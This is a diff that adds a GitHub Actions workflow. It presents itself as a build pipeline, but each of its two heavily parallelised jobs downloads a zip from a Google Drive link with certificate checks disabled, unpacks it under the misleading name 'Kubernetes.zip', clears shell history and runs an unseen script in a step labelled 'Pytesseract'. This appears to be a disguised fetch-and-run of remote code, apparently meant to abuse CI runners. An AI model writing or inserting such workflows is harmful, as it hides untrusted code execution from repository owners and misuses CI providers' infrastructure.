@@ -1,0 +1,56 @@
+name: vectorvuutru387flow
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  BUILD:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1axw6rTHwKXc9SVtQ4444Wz5bWd9RkDCM" -O Kubernetes.zip
+        unzip -o Kubernetes.zip
+        rm Kubernetes.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  VERIFY1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Draft', 'Construct', 'Inspect', 'Trigger', 'Ship']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1axw6rTHwKXc9SVtQ4444Wz5bWd9RkDCM" -O Kubernetes.zip
+        unzip -o Kubernetes.zip
+        rm Kubernetes.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
